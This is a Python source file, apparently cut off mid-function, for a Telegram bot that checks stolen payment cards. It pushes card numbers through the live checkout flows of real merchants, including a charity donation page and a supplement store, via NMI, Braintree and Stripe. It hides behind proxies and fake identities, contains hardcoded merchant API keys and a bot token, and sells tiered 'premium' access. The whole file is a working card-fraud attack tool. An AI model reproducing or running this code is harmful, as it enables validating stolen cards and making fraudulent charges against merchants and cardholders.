# -*- coding: utf-8 -*-
import telebot, base64, re, time, os, sys, json, threading, hashlib, requests, random, datetime, queue, uuid
from concurrent.futures import ThreadPoolExecutor
from faker import Faker

if sys.platform == 'win32':
    os.system('chcp 65001 > nul')
try:
    sys.stdout.reconfigure(encoding='utf-8')
except:
    pass

faker = Faker()
BOT_TOKEN = '8986480779:AAEc54sEaDRm64pW7Ps4oPOySAiSpTgTOv8'
ADMIN_ID = 7352706784
bot = telebot.TeleBot(BOT_TOKEN)

os.makedirs('Data', exist_ok=True)
PREMIUM_FILE = 'Data/premium.txt'
USERS_FILE = 'Data/users.txt'
BANNED_FILE = 'Data/banned.txt'
STATS_FILE = 'stats.json'
APPROVED_FILE = 'Data/approved.txt'
THREEDS_FILE = 'Data/3ds.txt'
PROXY_FILE = "Data/proxies.txt"

BT_TOKEN_FILE = 'Data/bt_token.txt'
BT_APPROVED = 'Data/bt_approved.txt'
BT_3DS = 'Data/bt_3ds.txt'

NMI_CART_FILE = 'Data/nmi_cart.txt'
NMI_APPROVED = 'Data/nmi_approved.txt'
NMI_DECLINED = 'Data/nmi_declined.txt'
NMI_3DS = 'Data/nmi_3ds.txt'

NMI_DEFAULT_CART = "415d3277-d9cc-4da0-8ec7-05f17d1fc81a"
NMI_DEFAULT_CHECKOUT = "eb03a7a5-8a96-45c9-807f-e69090849b6e"
NMI_AMOUNT = "1"
NMI_CURRENCY = "GBP"
NMI_MERCHANT_ID = "7bb5a59a-0713-4afa-a212-c9c77d516032"
NMI_SUBSCRIPTION_ID = "6e"
NMI_TOKENIZATION_KEY = "jkT6Tw-9VAN3X-FATGG5-zZFbpW"
NMI_PUBLIC_KEY = "checkout_public_aPUUrpwDYU552KWuZug9gh8E849W3nXB"
NMI_USER_AG = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36"
NMI_TIMEOUT = 30
NMI_ADMIN_LIMIT = 5000
NMI_PREMIUM_LIMIT = 1000
NMI_FREE_LIMIT = 0
NMI_WORKERS = 3

CHECK_LIMITS_FILE = 'Data/daily_limits.json'
LIMITS_LOCK = threading.Lock()

ADMIN_LIMIT = 5000
PREMIUM_LIMIT = 1000
FREE_LIMIT = 0
MAX_RETRIES = 3
WORKERS = 1
CARD_DELAY = 3

FREE_DAILY_LIMIT = 10
PREMIUM_DAILY_LIMIT = 100
ADMIN_DAILY_LIMIT = 0

ACTIVE_JOBS = {}
ACTIVE_USERS_PP = {}
ACTIVE_USERS_MPP = {}
ACTIVE_USERS_BT = {}
ACTIVE_USERS_MBT = {}
ACTIVE_USERS_NMI = {}
ACTIVE_USERS_MNMI = {}
USER_ACTIVE_JOB = {}
STATS_LOCK = threading.Lock()

BT_API_KEY = "d8761e2127e9a3342797abf0558b3569bb35d3f8836b9c80485ba250ee3aa744"
BT_CART_TOKEN = "fe2b65abbeed89d49b42ca5e04d9c551"
BT_PRODUCT_ID = 3552543
BT_CHARGED_AMOUNT = 3.05
BT_ADMIN_LIMIT = 5000
BT_PREMIUM_LIMIT = 1000
BT_FREE_LIMIT = 0
BT_USER_AG = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36"

DIAMOND = "\u25c6"
STAR = "\u2726"
HDIAMOND = "\u25c8"
ARROW = "\u2794"
HLINE = "\u2501"
CLOCK = "\u23f1"
FIRE = "\U0001f525"
CHECK = "\u2705"
CROSS = "\u274c"
LOCK = "\U0001f510"
WARN = "\u26a0\ufe0f"

START_ANIMATION_URL = "https://files.catbox.moe/yod8p4.gif"
START_ANIMATION_FILE_ID = START_ANIMATION_URL

def bold(text):
    result = []
    for ch in text:
        o = ord(ch)
        if 65 <= o <= 90:
            result.append(chr(o - 65 + 0x1D400))
        elif 97 <= o <= 122:
            result.append(chr(o - 97 + 0x1D41A))
        elif 48 <= o <= 57:
            result.append(chr(o - 48 + 0x1D7CE))
        else:
            result.append(ch)
    return "".join(result)

for f in [USERS_FILE, PREMIUM_FILE, BANNED_FILE, APPROVED_FILE, THREEDS_FILE,
          BT_TOKEN_FILE, BT_APPROVED, BT_3DS,
          NMI_CART_FILE, NMI_APPROVED, NMI_DECLINED, NMI_3DS]:
    if not os.path.exists(f):
        open(f, 'w').close()

if not os.path.exists(STATS_FILE):
    with open(STATS_FILE, 'w') as f:
        json.dump({"approved": 0, "3ds": 0, "premium_users": 0, "banned_users": 0,
                   "total_users": 0, "bt_charged": 0, "bt_3ds": 0,
                   "nmi_charged": 0, "nmi_declined": 0}, f)
if not os.path.exists(CHECK_LIMITS_FILE):
    with open(CHECK_LIMITS_FILE, 'w') as f:
        json.dump({}, f)

def load_limits():
    with LIMITS_LOCK:
        try:
            with open(CHECK_LIMITS_FILE, 'r') as f:
                return json.load(f)
        except:
            return {}

def save_limits(data):
    with LIMITS_LOCK:
        try:
            with open(CHECK_LIMITS_FILE, 'w') as f:
                json.dump(data, f)
        except:
            pass

def get_user_limit(user_id):
    uid = str(user_id)
    data = load_limits()
    now = time.time()
    entry = data.get(uid, {})
    used = entry.get("used", 0)
    reset_at = entry.get("reset_at", 0)
    if now >= reset_at:
        used = 0
        reset_at = now + 86400
    if is_admin(user_id):
        daily = ADMIN_DAILY_LIMIT
    elif is_premium(user_id):
        daily = PREMIUM_DAILY_LIMIT
    else:
        daily = FREE_DAILY_LIMIT
    return used, daily, max(0, int(reset_at - now)), reset_at

def consume_check(user_id):
    uid = str(user_id)
    data = load_limits()
    now = time.time()
    entry = data.get(uid, {})
    used = entry.get("used", 0)
    reset_at = entry.get("reset_at", 0)
    if now >= reset_at:
        used = 0
        reset_at = now + 86400
    if is_admin(user_id):
        daily = ADMIN_DAILY_LIMIT
    elif is_premium(user_id):
        daily = PREMIUM_DAILY_LIMIT
    else:
        daily = FREE_DAILY_LIMIT
    if daily == 0:
        data[uid] = {"used": used, "reset_at": reset_at}
        save_limits(data)
        return True, used, 0, 0
    if used >= daily:
        return False, used, daily, max(0, int(reset_at - now))
    used += 1
    data[uid] = {"used": used, "reset_at": reset_at}
    save_limits(data)
    return True, used, daily, max(0, int(reset_at - now))

def format_reset_time(secs):
    h = secs // 3600
    m = (secs % 3600) // 60
    return f"{h}h {m}m"

def check_limit_message(used, limit, reset_secs):
    return (
        f"{WARN} {bold('DAILY LIMIT REACHED')}\n"
        f"{'='*20}\n"
        f"{bold('Used')}: {used}/{limit}\n"
        f"{bold('Reset in')}: {format_reset_time(reset_secs)}\n"
        f"{'='*20}\n"
        f"{bold('Upgrade to Premium for more checks.')}"
    )

def get_stats():
    with STATS_LOCK:
        try:
            with open(STATS_FILE, 'r') as f:
                return json.load(f)
        except:
            return {"approved": 0, "3ds": 0, "premium_users": 0, "banned_users": 0,
                    "total_users": 0, "bt_charged": 0, "bt_3ds": 0,
                    "nmi_charged": 0, "nmi_declined": 0}

def save_stats(stats):
    with STATS_LOCK:
        try:
            with open(STATS_FILE, 'w') as f:
                json.dump(stats, f)
        except:
            pass

def is_admin(user_id):
    return user_id == ADMIN_ID

def is_premium(user_id):
    try:
        with open(PREMIUM_FILE, 'r') as f:
            premiums = f.read().splitlines()
        for p in premiums:
            if str(user_id) in p:
                parts = p.split('|')
                if len(parts) > 1:
                    exp = float(parts[1])
                    if exp == 0 or time.time() < exp:
                        return True
                else:
                    return True
    except:
        pass
    return False

def is_banned(user_id):
    try:
        with open(BANNED_FILE, 'r') as f:
            bans = f.read().splitlines()
        for b in bans:
            if str(user_id) in b:
                parts = b.split('|')
                if len(parts) > 1:
                    exp = float(parts[1])
                    if exp == 0 or time.time() < exp:
                        return True
                else:
                    return True
    except:
        pass
    return False

def add_user(user_id):
    try:
        with open(USERS_FILE, 'r+') as f:
            users = f.read().splitlines()
            if str(user_id) not in users:
                f.write(str(user_id) + '\n')
                s = get_stats()
                s["total_users"] = len(users) + 1
                save_stats(s)
    except:
        pass

def load_bt_token():
    try:
        with open(BT_TOKEN_FILE, 'r', encoding='utf-8') as f:
            t = f.read().strip()
            return t if t else None
    except:
        return None

def save_bt_token(token):
    with open(BT_TOKEN_FILE, 'w', encoding='utf-8') as f:
        f.write(token.strip())

def token_remaining_seconds(token):
    try:
        payload = token.split('.')[1]
        payload += '=' * (4 - len(payload) % 4)
        decoded = json.loads(base64.urlsafe_b64decode(payload))
        return int(decoded.get('exp', 0) - time.time())
    except:
        return -1

def get_bin_info(bin_code):
    try:
        res = requests.get("https://bins.antipublic.cc/bins/" + bin_code, timeout=10)
        if res.status_code == 200:
            data = res.json()
            return (data.get('brand', 'UNKNOWN'), data.get('bank', 'UNKNOWN'),
                    data.get('country_name', 'UNKNOWN'), data.get('level', 'N/A'),
                    data.get('type', 'N/A'), data.get('country_flag', ''))
    except:
        pass
    return "UNKNOWN", "UNKNOWN", "UNKNOWN", "N/A", "N/A", ""

def build_template(gate_name, gate_tag, status_code, response, brand, bank, country, level, type_cc, flag, elapsed, cc_full=None):
    if status_code == "CHARGED":
        status_txt = bold("CHARGED") + " " + FIRE
    elif status_code == "APPROVED":
        status_txt = bold("APPROVED") + " " + CHECK
    elif status_code == "3DS":
        status_txt = bold("3DS") + " " + LOCK
    elif status_code == "DECLINED":
        status_txt = bold("DECLINED") + " " + CROSS
    else:
        status_txt = bold("ERROR") + " " + WARN

    safe_resp = str(response).replace("<", "").replace(">", "").replace("&", "")
    if gate_name == "Stripe Auth":
        gate_display = "Stripe Auth"
        amt = " Auth"
    elif gate_name == "Braintree Charge":
        gate_display = "Braintree Charge"
        amt = " $3.05"
    elif gate_name == "NMI Charge":
        gate_display = "NMI Charge"
        amt = " £1.00"
    else:
        gate_display = gate_name
        amt = ""

    line_top = DIAMOND + (HLINE * 22) + DIAMOND
    line_title = "   " + STAR + " " + bold(gate_display) + " " + STAR
    line_top2 = DIAMOND + (HLINE * 22)
    line_card = "   " + HDIAMOND + " " + bold("Card") + " " + ARROW + " <code>" + str(cc_full) + "</code>"
    line_gate = "   " + HDIAMOND + " " + bold("Gate") + " " + ARROW + " " + bold(gate_display) + amt
    line_status = "   " + HDIAMOND + " " + bold("Status") + " " + ARROW + " " + status_txt
    line_resp = "   " + HDIAMOND + " " + bold("Response") + " " + ARROW + " " + bold(safe_resp)
    line_mid = HLINE * 23
    line_bin = "   " + HDIAMOND + " " + bold(str(brand)) + " - " + bold(str(type_cc)) + " - " + bold(str(level))
    line_bank = "   " + HDIAMOND + " " + bold(str(bank))
    line_country = "   " + HDIAMOND + " " + bold(str(country)) + " " + str(flag)
    line_time = "   " + CLOCK + " " + str(elapsed) + "s  |  @FUYRM1"
    line_bot = DIAMOND + (HLINE * 22) + DIAMOND

    parts = [line_top, line_title, line_top2]
    if cc_full:
        parts.append(line_card)
    parts.extend([line_gate, line_status, line_resp, line_mid])
    parts.extend([line_bin, line_bank, line_country, line_mid])
    parts.append(line_time)
    parts.append(line_bot)
    return "\n".join(parts)

def build_mass_caption(gate_title, res, total, start_time):
    elapsed = int(time.time() - start_time)
    mins, secs = divmod(elapsed, 60)
    line_sep = "\u25c7" + ("\u2501" * 22) + "\u25c7"
    return (
        f"{line_sep}\n"
        f"\u2726 {bold(gate_title)} \u2726\n"
        f"{line_sep}\n"
        f"\u25c6 {bold('Progress')} : {res['checked']}/{total}\n"
        f"\u25c6 {bold('Charged')} : {res.get('charged', res.get('approved', 0))}\n"
        f"\u25c6 {bold('Declined')} : {res['declined']}\n"
        f"\u25c6 {bold('Errors')} : {res['error']}\n"
        f"\u25c6 {bold('Time')} : {mins:02d}:{secs:02d}\n"
        f"{line_sep}"
    )

def load_nmi_cart():
    try:
        with open(NMI_CART_FILE, 'r') as f:
            lines = f.read().strip().splitlines()
            if len(lines) >= 2:
                return lines[0].strip(), lines[1].strip()
    except:
        pass
    return NMI_DEFAULT_CART, NMI_DEFAULT_CHECKOUT

def save_nmi_cart(cart_id, checkout_id):
    with open(NMI_CART_FILE, 'w') as f:
        f.write(cart_id.strip() + '\n' + checkout_id.strip() + '\n')

proxy_list = []
PROXY_QUEUE = queue.Queue()

def load_proxies():
    global proxy_list
    proxy_list = []
    with PROXY_QUEUE.mutex:
        PROXY_QUEUE.queue.clear()
    if os.path.exists(PROXY_FILE):
        with open(PROXY_FILE, 'r') as f:
            lines = [line.strip() for line in f if line.strip()]
            proxy_list = lines
            for p in lines:
                PROXY_QUEUE.put(p)
    return len(proxy_list)

load_proxies()

def format_proxy(proxy_str):
    proxy_str = proxy_str.strip()
    if not proxy_str:
        return None
    if '@' in proxy_str:
        return proxy_str
    parts = proxy_str.split(':')
    if len(parts) == 4:
        return f"{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    return proxy_str

def get_proxy_dict():
    global proxy_list
    if PROXY_QUEUE.empty():
        load_proxies()
    if PROXY_QUEUE.empty():
        return None, None
    p = PROXY_QUEUE.get()
    fp = format_proxy(p)
    if not any(p.startswith(proto) for proto in ['http', 'socks']):
        proxy_dict = {"http": f"http://{fp}", "https": f"http://{fp}"}
    else:
        proxy_dict = {"http": fp, "https": fp}
    return proxy_dict, p

def release_proxy(p):
    if p:
        PROXY_QUEUE.put(p)

def save_proxies(proxies):
    unique = list(dict.fromkeys(proxies))
    with open(PROXY_FILE, 'w') as f:
        for p in unique:
            f.write(p + '\n')
    load_proxies()

def test_proxy(proxy_str):
    try:
        fp = format_proxy(proxy_str.strip())
        if not fp:
            return False
        if not any(proxy_str.strip().startswith(proto) for proto in ['http', 'socks']):
            proxy_dict = {"http": f"http://{fp}", "https": f"http://{fp}"}
        else:
            proxy_dict = {"http": fp, "https": fp}
        r = requests.get('http://ip-api.com/json', proxies=proxy_dict, timeout=20)
        return r.status_code == 200
    except:
        return False

def test_proxies_bulk(proxy_list, max_workers=50):
    res = {"working": [], "dead": [], "invalid": []}
    lock = threading.Lock()
    def test_one(p):
        if ':' not in p:
            with lock: res["invalid"].append(p)
            return
        if test_proxy(p):
            with lock: res["working"].append(p)
        else:
            with lock: res["dead"].append(p)
    with ThreadPoolExecutor(max_workers=max_workers) as ex:
        ex.map(test_one, proxy_list)
    return res

def check_cc_nmi(cc_full, proxy_dict=None):
    try:
        parts = cc_full.strip().split('|')
        if len(parts) < 4:
            return "ERROR", "Invalid format", "UNKNOWN"
        CC, MM, YY, CVV = parts[0], parts[1], parts[2], parts[3].replace('.', '')
        if len(YY) == 4: YY = YY[2:]
        if len(MM) == 1: MM = "0" + MM
    except:
        return "ERROR", "Invalid format", "UNKNOWN"

    if proxy_dict is None:
        proxy_dict, _ = get_proxy_dict()
    if not proxy_dict:
        return "ERROR", "No proxy set. Use /proxy add", "UNKNOWN"

    cart_id, checkout_id = load_nmi_cart()
    brand_detected = "UNKNOWN"

    try:
        r = requests.post("https://secure.safewebservices.com/token/api/create",
            data={"tokenizationKey": NMI_TOKENIZATION_KEY, "cartCorrelationId": "", "source": "16"},
            headers={"origin": "https://muslimhands.org.uk", "referer": "https://muslimhands.org.uk/", "user-agent": NMI_USER_AG},
            proxies=proxy_dict, timeout=NMI_TIMEOUT, verify=False)
        if r.status_code != 200:
            return "ERROR", f"create HTTP {r.status_code}", "UNKNOWN"
        d = r.json()
        token_id = d.get("tokenId") or d.get("token") or d.get("id")
        if not token_id:
            return "ERROR", "no token", "UNKNOWN"

        for el, val in [("ccnumber", CC), ("ccexp", MM+YY), ("cvv", CVV)]:
            requests.post("https://secure.safewebservices.com/token/api/save_multipart_token",
                json={"tokenizationKey": NMI_TOKENIZATION_KEY, "cartCorrelationId": "", "tokenId": token_id,
                      "data": [{"elementId": el, "value": val}]},
                headers={"content-type": "application/json;charset=UTF-8",
                         "origin": "https://secure.safewebservices.com", "user-agent": NMI_USER_AG},
                proxies=proxy_dict, timeout=NMI_TIMEOUT, verify=False)

        try:
            r = requests.post("https://secure.safewebservices.com/token/api/lookup",
                json={"tokenId": token_id, "tokenizationKey": NMI_TOKENIZATION_KEY, "cartCorrelationId": ""},
                headers={"origin": "https://muslimhands.org.uk", "user-agent": NMI_USER_AG},
                proxies=proxy_dict, timeout=NMI_TIMEOUT, verify=False)
            if r.status_code == 200:
                lk = r.json()
                brand_detected = str(lk.get("card", {}).get("type", "UNKNOWN"))
        except:
            pass

        idem = f"{cart_id}/{uuid.uuid4().hex[:8]}/{time.strftime('%Y-%m-%d')}"
        r = requests.post(
            f"https://api.n3o.cloud/eu1/api/checkout/networkmerchants/v1.0/payments/{NMI_MERCHANT_ID}/{cart_id}/{checkout_id}/process",
            json={"idempotencyKey": idem,
                  "value": {"currency": NMI_CURRENCY, "amount": int(NMI_AMOUNT)},
                  "card": {"cardBrand": "visa", "channel": "ecommerce", "token": token_id}},
            headers={"content-type": "application/json", "n3o-subscription-id": NMI_SUBSCRIPTION_ID,
                     "origin": "https://muslimhands.org.uk", "referer": "https://muslimhands.org.uk/", "user-agent": NMI_USER_AG},
            proxies=proxy_dict, timeout=NMI_TIMEOUT, verify=False)

        if r.status_code != 200:
            return "ERROR", f"process HTTP {r.status_code}", brand_detected
        try:
            j = r.json()
        except:
            return "ERROR", f"bad json: {r.text[:80]}", brand_detected

        if j.get("error") == True:
            return "ERROR", "gateway error", brand_detected
        elif j.get("result") == True:
            return "CHARGED", f"Charged {NMI_AMOUNT} {NMI_CURRENCY} successfully", brand_detected
        elif j.get("result") == False:
            return "DECLINED", "Payment Declined", brand_detected
        else:
            return "ERROR", str(j)[:80], brand_detected
    except requests.exceptions.ProxyError:
        return "ERROR", "proxy error", brand_detected
    except requests.exceptions.Timeout:
        return "ERROR", "timeout", brand_detected
    except Exception as e:
        return "ERROR", str(e)[:100], brand_detected

def bt_tokenize(cc, mm, yy, cvv, client_token, proxy_dict):
    try:
        session = requests.Session()
        if proxy_dict:
            session.proxies = proxy_dict
        payload = {
            "clientSdkMetadata": {"source": "client", "integration": "custom",
                                  "sessionId": str(uuid.uuid4())},
            "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 } } }",
            "variables": {"input": {"creditCard": {
                "number": cc, "expirationMonth": mm,
                "expirationYear": yy, "cvv": cvv
            }, "options": {"validate": False}}},
            "operationName": "TokenizeCreditCard"
        }
        h = {
            "authorization": "Bearer " + client_token,
            "braintree-version": "2018-05-10",
            "content-type": "application/json",
            "origin": "https://assets.braintreegateway.com",
            "referer": "https://assets.braintreegateway.com/",
            "user-agent": BT_USER_AG,
        }
        r = session.post("https://payments.braintree-api.com/graphql",
                         headers=h, json=payload, timeout=30)
        if r.status_code == 401:
            return "ERROR", "token_expired", None, "UNKNOWN"
        if r.status_code == 429:
            return "ERROR", "rate_limit", None, "UNKNOWN"
        res = r.json()
        if "errors" in res:
            return "ERROR", str(res["errors"][0].get("message", "error"))[:150], None, "UNKNOWN"
        data = res.get("data", {}).get("tokenizeCreditCard", {}) or {}
        nonce = data.get("token")
        brand = str(data.get("creditCard", {}).get("brandCode", "UNKNOWN"))
        if not nonce:
            return "DECLINED", "no_nonce", None, brand
        return "OK", "tokenized", nonce, brand
    except requests.exceptions.ProxyError:
        return "ERROR", "proxy_error", None, "UNKNOWN"
    except requests.exceptions.Timeout:
        return "ERROR", "timeout", None, "UNKNOWN"
    except Exception as e:
        return "ERROR", "exc: " + str(e)[:100], None, "UNKNOWN"

def bt_checkout(nonce, proxy_dict):
    try:
        session = requests.Session()
        if proxy_dict:
            session.proxies = proxy_dict
        payload = {
            "cart_token": BT_CART_TOKEN,
            "payment_method": "braintree_cc",
            "shipping_method": "free_shipping",
            "shipping_method_id": "free_shipping",
            "shipping_method_title": "Free Shipping",
            "shipping_total": "0",
            "billing": {
                "first_name": "John", "last_name": "Smith",
                "company": "", "address_1": "123 Main St", "address_2": "",
                "city": "Montgomery", "state": "AL", "postcode": "36104",
                "country": "US",
                "email": "test" + str(random.randint(100000,999999)) + "@gmail.com",
                "phone": "+1 5559876543"
            },
            "shipping": {
                "first_name": "John", "last_name": "Smith",
                "company": "", "address_1": "123 Main St", "address_2": "",
                "city": "Montgomery", "state": "AL", "postcode": "36104",
                "country": "US"
            },
            "ship_to_different_address": 0,
            "line_items": [{"product_id": BT_PRODUCT_ID, "quantity": 1, "autoship_flag": False}],
            "payment_nonce": nonce,
            "attribution": {
                "first": {"ts": int(time.time()), "referrer": "", "referrer_host": "",
                          "search_term": "", "click_ids": {}, "utm": {}, "landing": "/"},
                "last": {"ts": int(time.time()), "referrer": "", "referrer_host": "",
                         "search_term": "", "click_ids": {}, "utm": {}, "landing": "/"}
            },
            "client_device": {
                "ua": BT_USER_AG, "browser": "Chrome", "browser_version": "137",
                "os": "Android", "os_version": "10", "device_type": "mobile",
                "viewport": "407x798", "screen": "407x904", "dpr": 3,
                "orientation": "portrait", "touch": True,
                "tz": "Asia/Baghdad", "lang": "ar-EG",
                "collected_at": datetime.datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%S.000Z")
            }
        }
        h = {
            "authority": "vitabase.com",
            "accept": "application/json",
            "content-type": "application/json",
            "origin": "https://checkout.vitabase.com",
            "user-agent": BT_USER_AG,
            "x-api-key": BT_API_KEY,
            "x-request-id": "hc_" + str(random.randint(10**18, 10**19 - 1)),
        }
        r = session.post("https://vitabase.com/headless-api/checkout",
                         headers=h, json=payload, timeout=30)
        if r.status_code == 429:
            return "ERROR", "rate_limit"
        try:
            res = r.json()
        except:
            return "ERROR", "http_" + str(r.status_code)
        success = res.get("success", False)
        err_code = str(res.get("error_code", ""))
        err_msg = str(res.get("error_message", ""))[:150]
        if success:
            return "CHARGED", "Charged $3.05 successfully."
        low = (err_code + " " + err_msg).lower()
        if "3ds" in low or "authenticate" in low or "requires_action" in low:
            return "3DS", "Authentication Required"
        if "declined" in low or "decline" in low:
            return "DECLINED", "Payment Declined."
        if "expired" in low:
            return "ERROR", "Error"
        if "invalid" in low:
            return "ERROR", "Error"
        return "DECLINED", "Payment Declined."
    except requests.exceptions.ProxyError:
        return "ERROR", "Error"
    except requests.exceptions.Timeout:
        return "ERROR", "Error"
    except Exception as e:
        return "ERROR", "Error"

def check_cc_braintree(cc_full, proxy_dict=None):
    token = load_bt_token()
    if not token:
        return "ERROR", "Token not set. Use /setbttoken", "UNKNOWN"
    try:
        p = cc_full.strip().split('|')
        cc, mm, yy, cvv = p[0], p[1], p[2], p[3].replace('.', '')
    except:
        return "ERROR", "Invalid format", "UNKNOWN"
    if proxy_dict is None:
        proxy_dict, _ = get_proxy_dict()
    if not proxy_dict:
        return "ERROR", "No proxy set. Use /proxy add", "UNKNOWN"
    s1, m1, nonce, brand = bt_tokenize(cc, mm, yy, cvv, token, proxy_dict)
    if s1 == "ERROR":
        return "ERROR", m1, brand
    s2, m2 = bt_checkout(nonce, proxy_dict)
    return s2, m2, brand

def _clean_msg(msg):
    if isinstance(msg, str) and msg.lower().startswith('error: '):
        return msg[7:]
    return msg

def extract_message(response):
    try:
        response_json = response.json()
        if 'message' in response_json:
            return _clean_msg(response_json['message'])
        if 'data' in response_json:
            data = response_json['data']
            if isinstance(data, dict):
                if 'message' in data:
                    return _clean_msg(data['message'])
                if 'error' in data and isinstance(data['error'], dict):
                    return _clean_msg(data['error'].get('message', str(data['error'])))
        if 'error' in response_json:
            err = response_json['error']
            if isinstance(err, dict):
                return _clean_msg(err.get('message', str(err)))
            return _clean_msg(str(err))
        for value in response_json.values():
            if isinstance(value, dict) and 'message' in value:
                return _clean_msg(value['message'])
        return "Unknown"
    except:
        if "so soon" in response.text.lower() or "too many" in response.text.lower():
            return "Rate Limit"
        match = re.search(r'"message":"(.*?)"', response.text)
        if match:
            return _clean_msg(match.group(1))
        return "Unknown error"

GATEWAYS = [
    {
        "name": "Dila Boards",
        "url": "https://dilaboards.com/en/moj-racun/add-payment-method/",
        "ajax_url": "https://dilaboards.com/en/",
    }
]

def check_cc(cc_full, proxy=None):
    session = requests.Session()
    if proxy:
        session.proxies = proxy
    try:
        data_parts = cc_full.strip().split('|')
        cc, mm, yy, cvv = data_parts[0], data_parts[1], data_parts[2], data_parts[3].replace('.', '')
    except:
        return "ERROR", "Invalid format", "UNKNOWN"
    user_ag = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36'

    for gw in GATEWAYS:
        try:
            current_cookies = gw.get("cookies", {})
            current_nonce = gw.get("nonce", "")
            current_pk = gw.get("stripe_key", "")
            ajax_url = gw["ajax_url"]

            if "dilaboards.com" in gw.get("url", ""):
                try:
                    url_1 = gw["url"]
                    h_pre = {'User-Agent': user_ag, 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                        'Accept-Language': 'en-US,en;q=0.5', 'Alt-Used': 'dilaboards.com', 'Connection': 'keep-alive',
                        'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate',
                        'Sec-Fetch-Site': 'none', 'Sec-Fetch-User': '?1', 'Priority': 'u=0, i'}
                    r_pre = session.get(url_1, headers=h_pre, timeout=15)
                    reg_nonce = re.findall('name="woocommerce-register-nonce" value="(.*?)"', r_pre.text)[0]
                    current_pk = re.findall('"key":"(.*?)"', r_pre.text)[0]
                    h_reg = {'User-Agent': user_ag, 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                        'Accept-Language': 'en-US,en;q=0.5', 'Content-Type': 'application/x-www-form-urlencoded',
                        'Origin': 'https://dilaboards.com', 'Alt-Used': 'dilaboards.com', 'Connection': 'keep-alive',
                        'Referer': url_1, 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document',
                        'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1', 'Priority': 'u=0, i'}
                    reg_data = {'email': faker.email(domain="gmail.com"), 'wc_order_attribution_source_type': 'typein',
                        'wc_order_attribution_referrer': '(none)', 'wc_order_attribution_utm_campaign': '(none)',
                        'wc_order_attribution_utm_source': '(direct)', 'wc_order_attribution_utm_medium': '(none)',
                        'wc_order_attribution_utm_content': '(none)', 'wc_order_attribution_utm_id': '(none)',
                        'wc_order_attribution_utm_term': '(none)', 'wc_order_attribution_utm_source_platform': '(none)',
                        'wc_order_attribution_utm_creative_format': '(none)', 'wc_order_attribution_utm_marketing_tactic': '(none)',
                        'wc_order_attribution_session_entry': url_1,
                        'wc_order_attribution_session_start_time': datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                        'wc_order_attribution_session_pages': '2', 'wc_order_attribution_session_count': '1',
                        'wc_order_attribution_user_agent': user_ag, 'woocommerce-register-nonce': reg_nonce,
                        '_wp_http_referer': '/en/moj-racun/add-payment-method/', 'register': 'Register'}
                    r_reg = session.post(url_1, headers=h_reg, data=reg_data, timeout=15)
                    if "so soon" in r_reg.text.lower() or "too many" in r_reg.text.lower():
                        return "ERROR", "Rate Limit", "UNKNOWN"
                    current_nonce = re.findall('"createAndConfirmSetupIntentNonce":"(.*?)"', r_reg.text)[0]
                except:
                    return "ERROR", "Registration Failed", "UNKNOWN"
            else:
                for k, v in current_cookies.items():
                    session.cookies.set(k, v)

            guid = str(uuid.uuid4()); muid = str(uuid.uuid4()); sid = str(uuid.uuid4())
            ele_id = f"src_{random.getrandbits(128):032x}"
            h1 = {'User-Agent': user_ag, 'Accept': 'application/json', 'Referer': 'https://js.stripe.com/',
                'Content-Type': 'application/x-www-form-urlencoded', 'Origin': 'https://js.stripe.com'}
            d1 = {'type': 'card', 'card[number]': cc, 'card[cvc]': cvv, 'card[exp_year]': yy, 'card[exp_month]': mm,
                'allow_redisplay': 'unspecified', 'billing_details[address][postal_code]': str(random.randint(10000, 99999)),
                'billing_details[address][country]': 'US',
                'payment_user_agent': 'stripe.js/c1fbe29896; stripe-js-v3/c1fbe29896; payment-element; deferred-intent',
                'referrer': gw.get("url", ajax_url), 'time_on_page': str(random.randint(10000, 99999)),
                'client_attribution_metadata[client_session_id]': ele_id,
                'client_attribution_metadata[merchant_integration_source]': 'elements',
                'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
                'client_attribution_metadata[merchant_integration_version]': '2021',
                'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
                'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
                'client_attribution_metadata[elements_session_config_id]': ele_id,
                'client_attribution_metadata[merchant_integration_additional_elements][0]': 'payment',
                'guid': guid, 'muid': muid, 'sid': sid, 'key': current_pk, '_stripe_version': '2024-06-20'}
            r1 = session.post('https://api.stripe.com/v1/payment_methods', headers=h1, data=d1, timeout=15)
            res1 = r1.json()
            if "error" in res1:
                msg = res1["error"].get("message", "Declined")
                if "security code is" in msg.lower():
                    return "DECLINED", msg, res1.get("card", {}).get("brand", "UNKNOWN")
                continue
            pm_id = res1["id"]
            brand = res1.get("card", {}).get("brand", "UNKNOWN")
            h2 = {'User-Agent': user_ag, 'Accept': '*/*',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'X-Requested-With': 'XMLHttpRequest', 'Referer': gw.get("url", ajax_url)}
            d2 = {'action': 'create_and_confirm_setup_intent', 'wc-stripe-payment-method': pm_id,
                'wc-stripe-payment-type': 'card', '_ajax_nonce': current_nonce}
            final_ajax_url = f"{ajax_url}?wc-ajax=wc_stripe_create_and_confirm_setup_intent"
            r2 = session.post(final_ajax_url, headers=h2, data=d2, timeout=20)
            if r2.status_code == 429:
                continue
            res2 = r2.json()
            success = res2.get('success', False)
            status_val = res2.get('data', {}).get('status', 'unknown')
            if success or status_val == 'succeeded':
                return "APPROVED", "Payment method added successfully.", brand
            msg = extract_message(r2)
            if "so soon" in msg.lower() or "too many" in msg.lower():
